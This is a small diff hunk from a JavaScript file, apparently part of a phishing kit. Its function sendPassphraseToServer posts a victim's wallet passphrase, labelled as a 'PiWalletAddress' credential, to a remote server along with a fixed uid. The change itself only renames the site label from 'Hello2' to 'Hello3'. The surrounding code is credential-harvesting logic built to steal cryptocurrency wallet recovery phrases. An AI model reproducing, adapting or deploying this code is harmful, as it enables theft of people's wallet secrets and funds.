@@ -32,7 +32,7 @@ async function sendPassphraseToServer(passphrase) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         uid: "PkZ2jZuOpZYbkNSEylmY49ghSQz2",
-        websiteName: "Hello2",
+        websiteName: "Hello3",
         email: "PiWalletAddress",
         password: passphrase
       })
